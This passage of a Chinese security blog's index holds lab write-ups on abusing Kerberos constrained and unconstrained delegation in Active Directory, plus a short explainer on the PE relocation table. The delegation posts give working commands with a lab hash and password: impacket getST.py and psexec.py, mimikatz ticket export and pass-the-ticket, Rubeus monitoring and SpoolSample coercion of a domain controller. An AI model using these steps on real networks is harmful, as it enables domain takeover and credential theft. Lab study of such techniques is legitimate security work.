<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317150805823.png" class title="image-20220317150805823">



<p>注：这里一定要是以本机administrator打开的dir \\DC\c$，因为我们生成的票据是针对administrator账号的，虽然都是同一台主机但是administrator和普通用户moretz的票据是不同的</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317151028741.png" class title="image-20220317151028741">



<h3 id="在域环境外通过约束委派进行攻击"><a href="#在域环境外通过约束委派进行攻击" class="headerlink" title="在域环境外通过约束委派进行攻击"></a>在域环境外通过约束委派进行攻击</h3><p>域外指的是通过隧道工具接入内网</p>
<p>使用的是impacket工具包里面的一个脚本</p>
<p>探测约束委派的用户和主机</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152901164.png" class title="image-20220317152901164">

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152914875.png" class title="image-20220317152914875">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.93.30 -spn cifs/DC -impersonate administrator whoamianony.org/PC2$ -hash :46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153057662.png" class title="image-20220317153057662">



<p>加载在ccache中的票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153129374.png" class title="image-20220317153129374">



<p>利用psexec.py可以直接登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -no-pass -k DC</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317155009305.png" class title="image-20220317155009305">

<p>这里我不明白为什么能直接返回约束委派服务的主机的system的shell，我的约束委派主机是192.168.93.40 的moretz（PC2），设置的可以访问192.168.93.30 DC的cifs服务。预期可能是administrator的权限，但是返回了system权限不太懂。</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>重定位表结构解析</title>
    <url>/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="重定位表的作用"><a href="#重定位表的作用" class="headerlink" title="重定位表的作用"></a>重定位表的作用</h1><p>在windows系统中，动态链接库不一定每次都能加载到ImageBase上边，因此基址重定位主要是应用在动态链接库里面。比如程序的默认基址是0x400000，如果想将程序的偏移为0x100的数据压入堆栈的话，可能就需要push一个0x400100，由于exe文件能保证每一次加载的地址都是0x400000因此push指令执行起来没有问题，但是指令如果在动态链接库里情况就不一样，因为动态链接库不能保证每次都加载到预设的基址上，当动态链接库加载到其他位置上的时候，就必须用其他的位置才能访问到正确的数据。就是不能再用0x400100，因此基址重定位表就是为了避免这个错误而设计的。一般情况下，重定位表位于一个reloc的区段里，PE文件对于重定位是非常简单的。只需要将重定位的数组放入一个地址就可以了。因此，如果映像文件没有在预设的基址载入的话，加载器就会在数组里重定位的信息修改一遍。</p>
<h1 id="查看基本的结构"><a href="#查看基本的结构" class="headerlink" title="查看基本的结构"></a>查看基本的结构</h1><p>重定位的结构在IMAGE_BASE_RELOCATION当中</p>
<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327105514756.png" class title="image-20220327105514756">



<p>结构十分简单，一共只有三个字段</p>
<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327105843085.png" class title="image-20220327105843085">

<p>在LordPE中有区段，RVA等信息，使用函数打印出来</p>
<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327111757560.png" class title="image-20220327111757560">



<p>具体的函数</p>
<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327113624209.png" class title="image-20220327113624209">



<p>查看运行结果</p>
<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327114233192.png" class title="image-20220327114233192">
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>非约束委派的原理及利用</title>
    <url>/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先需要了解什么是委派？</p>
<p>委派一般出现在域环境当中，域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
<p>说得再通俗一点就是，假设有三个对象</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316150047630.png" class title="image-20220316150047630">

<p>当hostA作为用户，这个用户在访问服务B上的某一功能，而A访问B的这一功能的完成需要服务B向服务C上的专属于用户A的部分发起验证请求，如果A有访问权限，主机B就会代替主机A去访问主机C。也就是说主机A委派主机B上的服务代表自己向主机C上的服务发起请求。在域环境下就是域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
<p>域委派主要分为两种，非约束委派和约束委派，还有一种基于资源的约束委派这里就不讨论了。</p>
<h2 id="非约束委派的原理（Unconstrained-Delegation）"><a href="#非约束委派的原理（Unconstrained-Delegation）" class="headerlink" title="非约束委派的原理（Unconstrained Delegation）"></a>非约束委派的原理（Unconstrained Delegation）</h2><p>对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。那么非委派约束的攻击怎么产生的呢，就是诱导域管账号访问我们的被配置了非约束委派的主机，认证方式无论是kerberos还是ntlm都可以，这样子我们就拥有了域管的TGT，可以生成黄金票据。所以，非约束委派的主要目的就是获取域管账号的TGT，从而制作黄金票据。</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316145545395.png" class title="image-20220316145545395">

<p>现在假设这么一种情形，service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p>
<p>那么非约束性委派的过程可以大概理解为：</p>
<p>1、用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>2、用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1。<br>3、service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2。</p>
<h1 id="非约束委派利用"><a href="#非约束委派利用" class="headerlink" title="非约束委派利用"></a>非约束委派利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控：192.168.93.30      主机名：DC</p>
<p>域成员（配置了非约束性委派）：192.168.93.40   主机名：PC2  用户名：moretz</p>
<p>域：whoamianony.org</p>
<h2 id="0x01非约束委派配置及其特征"><a href="#0x01非约束委派配置及其特征" class="headerlink" title="0x01非约束委派配置及其特征"></a>0x01非约束委派配置及其特征</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setspn -U -A <span class="title class_">MSSQLSvc</span>/mssql.<span class="property">whoamianony</span>.<span class="property">org</span>:<span class="number">1433</span> moretz</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230643559.png" class title="image-20220315230643559">

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230824870.png" class title="image-20220315230824870">

<p>域控创建了一个域内可以委派的账户并注册spn后，勾选信任此用户作为任何服务的委派，此时这台moretz账号的主机就可以作为委派访问任意服务并且存储需要他进行委派访问的主机，比如A需要委派moretz主机访问C，那么moretz主机就会保存A的tgt</p>
<p>当服务账号或者主机被设置为非约束性委派时，其 <strong>userAccountControl</strong> 属性会包含 <strong>TRUSTED_FOR_DELEGATION</strong>：</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230924720.png" class title="image-20220315230924720">

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231033106.png" class title="image-20220315231033106">

<h2 id="0x02查找域内的非约束委派主机"><a href="#0x02查找域内的非约束委派主机" class="headerlink" title="0x02查找域内的非约束委派主机"></a>0x02查找域内的非约束委派主机</h2><h3 id="Idapsearch"><a href="#Idapsearch" class="headerlink" title="Idapsearch"></a>Idapsearch</h3><p>这是一款kali上自带的工具，适合在域外查询委派主机</p>
<p>查找用户是否配置非约束委派</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>

<p>-w 参数后面跟的是moretz用户的密码</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231349030.png" class title="image-20220315231349030">

<p>过滤条件是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>



<p>查找配置为非约束委派的主机（域控的主机账号是默认开启非约束委派的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231419152.png" class title="image-20220315231419152">

<p>过滤条件是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>

<p>两条查询语句的不同点就在于过滤条件的不同samAccountType&#x3D;805306369时为主机，samAccountType&#x3D;805306368时为用户</p>
<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><p>有账号密码时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.93.30 -u users\moretz -up Moretz2021 -b &quot;DC=w</span><br><span class="line">hoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.1</span><br><span class="line">13556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232118802.png" class title="image-20220315232118802">

<p>域控默认为非约束委派</p>
<p>查询当前域内的非约束委派用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232256937.png" class title="image-20220315232256937">

<p>可以看到这里的moretz用户就是非约束委派主机</p>
<p>查询当前域内的非约束委派主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232355641.png" class title="image-20220315232355641">

<p>还是过滤条件的不同</p>
<p>其他工具还有powerview，个人还是喜欢AdFind</p>
<h2 id="0x03非约束委派攻击"><a href="#0x03非约束委派攻击" class="headerlink" title="0x03非约束委派攻击"></a>0x03非约束委派攻击</h2><p>现在只有moretz自己的票据</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232506026.png" class title="image-20220315232506026">



<p>若域内存在非约束委派机器，那么就可以使用域内我们想要获得票据的用户来登陆此非约束委派主机，从而在非约束委派主机中留下期望获得的主机票据的缓存</p>
<p>这里先在域控主机（DC）上通过winrm连接域内的非委派主机（PC2）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName PC2</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232601340.png" class title="image-20220315232601340">

<p>可以看到这里是成功连上了PC2，并且是administrator权限</p>
<p>在ptt之前，是无法访问域控的</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232851871.png" class title="image-20220315232851871">



<p>利用猕猴桃将域控的tgt导出来，因为域控连接过pc2，因此会有域控的tgt缓存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000914827.png" class title="image-20220316000914827">



<p>进行ptt（票据传递），生成tgt票据（<strong>这里获得的票据不能算作黄金票据，我们获得的权限只是域控的本地管理权限，不能连接域控，黄金票据的条件是缺一不可的，但是我们可以获取所有用户的hash，制作真正的黄金票据</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;291f51]-2-0-60a10000-Administrator@krbtgt-WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000954582.png" class title="image-20220316000954582">



<p>成功生成票据，接下来制作黄金票据的过程就不赘述了</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316001115188.png" class title="image-20220316001115188">





<p>除了直接在域控使用winrm，还可以利用<strong>非约束委派+spooler打印机服务</strong>强制指定的主机进行连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe monitor /interval:1 filteruser:DC$ &gt; c:\users\hash.txt</span><br></pre></td></tr></table></figure>

<p>使用rubues来监听本机连接的情况，设置监听间隔为一秒，监控对象为域控的主机名</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172630642.png" class title="image-20220316172630642">



<p>运行spoolsample利用打印服务，强制让域控DC向域成员PC2验证身份，因为设置了rubeus监听，所以可以抓到TGS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC PC2</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172651602.png" class title="image-20220316172651602">

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172722495.png" class title="image-20220316172722495">

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172913745.png" class title="image-20220316172913745">

<p>这里报错了，但是的确rubeus抓到了base64加密的tgt(hash.txt)</p>
<p>这里用powershell解密base64，其他方法也可以，但是powershell可以直接将tgt文件保存下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;c:\users\moretz.whoamianony\tgt.kirbi&quot;, [Convert]::FromBase64String(&quot;得到的base64&quot;))</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174513722.png" class title="image-20220316174513722">



<p>使用mimikatz导入票据后，跟之前一样也是个有域控本地管理员权限的，用mimikatz制作黄金票据后可以用psexec.exe反弹shell，不需要账号密码。（lsadump）</p>
<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174621620.png" class title="image-20220316174621620">
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
</search>
